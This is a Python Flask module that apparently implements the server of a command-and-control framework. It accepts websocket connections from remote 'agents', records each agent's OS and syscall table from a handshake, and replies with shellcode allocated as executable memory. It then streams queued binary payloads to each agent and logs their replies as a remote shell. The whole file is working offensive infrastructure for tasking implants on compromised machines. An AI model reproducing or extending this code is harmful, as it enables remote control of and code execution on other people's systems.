from flask import request, jsonify, Blueprint, current_app, g, url_for
from flask_jwt_extended import create_access_token,create_refresh_token, jwt_required, get_jwt_identity, get_jwt
from utils import sanitize_username, check_password_complexity
from flask_jwt_extended.utils import decode_token
from app import anon_bp
from flask_jwt_extended.exceptions import JWTExtendedException
from routes.auth.sudo.system import sock
from models.agent import Agent
from models.line import Line
from models.syscall import Syscall
from services.binary import push_syscall, allocmem
import logging
import struct
logger = logging.getLogger(__name__)

bp = Blueprint("agent", __name__, url_prefix='/agent')

from flask import request, current_app
import threading
import time



def parse_handshake(msg, agent_id):
    ip = request.remote_addr
    if msg is None:
        raise ValueError("empty handshake")

    # Normalize handshake to bytes
    if isinstance(msg, str):
        msg = msg.encode("utf-8")

    if not isinstance(msg, (bytes, bytearray)):
        raise TypeError(f"unexpected handshake type: {type(msg)!r}")

    msg = bytes(msg)
    parts = msg.split(b';')
    os_bytes = parts[0]
    scratchpad = parts[1]
    syscall_blob = parts[2]
    agent = Agent.by_id(agent_id)
    os_name = os_bytes.decode("utf-8", errors="replace")
    agent.os = os_name
    agent.scratchpad = scratchpad
    agent.save()
    print(f"New agent os = {os_name}, scratchpad = {scratchpad}")
    Syscall.save_syscalls_bytes(agent.id, syscall_blob)

def handle_msg_type(msg, agent_id):
    if not msg:
        return

    msg_type = msg[0]
    payload = msg[1:]

    if msg_type == 0x00:
        # handshake
        parse_handshake(msg, agent_id)
        retparams, shellcode = allocmem(agent_id, 0x1000, 0x40)
        to_send = bytearray()
        to_send.extend(b'\x00')
        print(len(shellcode))
        to_send.extend(struct.pack('<Q', int(len(shellcode))))
        to_send.extend(shellcode)
        for retparam in retparams:
            to_send.extend(struct.pack('<Q', retparam))
        print(to_send.hex())
        line = Line.create_for_agent(
            agent_id=agent_id,
            content=to_send,
            incoming=False
        )
        line.save()


        

    elif msg_type == 0x01:
        # returned message
        line = Line.create_for_agent(
            agent_id=agent_id,
            content=payload,
            incoming=True
        )
        line.save()

    else:
        # unknown message type
        line = Line.create_for_agent(
            agent_id=agent_id,
            content=f"[unknown msg type 0x{msg_type:02x}] {payload!r}",
            incoming=True
        )
        line.save()


@sock.route(f"{anon_bp.url_prefix}{bp.url_prefix}/ws/<agent_id>")
def server_agent_ws(ws, agent_id):
    print(f"Requesting shell for agent {agent_id}...")
    agent = Agent.by_id(agent_id)
    if agent is None:
        agent = Agent(agent_id, "admin")
        agent.save()

    app = current_app._get_current_object()
    stop_event = threading.Event()

    def poll_outgoing():
        last_sent_id = 0

        with app.app_context():
            while not stop_event.is_set():
                try:
                    lines = Line.by_agent_outgoing_after(agent_id, last_sent_id)

                    for line in lines:
                        last_sent_id = line.id

                        # Expect binary content in DB/model.
                        data = line.content
                        if isinstance(data, str):
                            data = data.encode("utf-8")
                        elif isinstance(data, bytearray):
                            data = bytes(data)

                        print(
                            f"Sending to agent {agent_id}: "
                            f"{len(data)} bytes"
                        )

                        try:
                            ws.send(data)
                        except Exception:
                            stop_event.set()
                            break

                    time.sleep(1)

                except Exception:
                    logger.exception("Failed polling outgoing lines for agent %s", agent_id)
                    stop_event.set()

    poll_thread = threading.Thread(target=poll_outgoing, daemon=True)
    poll_thread.start()

    try:
        while not stop_event.is_set():
            try:
                message = ws.receive()
                print(f"Received message {message}")
            except Exception:
                logger.info("WebSocket receive failed/closed for agent %s", agent.id)
                break

            if message is None:
                logger.info("WebSocket closed for agent %s", agent.id)
                break

            # Normalize everything to bytes
            if isinstance(message, str):
                message = message.encode("utf-8")
            elif isinstance(message, bytearray):
                message = bytes(message)

            if not isinstance(message, bytes):
                logger.warning(
                    "Unexpected websocket message type for agent %s: %r",
                    agent.id,
                    type(message),
                )
                continue

            if not message:
                continue

            with app.app_context():
                print(
                    f"Received from agent {agent_id}: "
                    f"{len(message)} bytes"
                )
                handle_msg_type(message, agent.id)
    finally:
        stop_event.set()
        if agent is not None:
            agent.online = False
        try:
            ws.close()
        except Exception:
            pass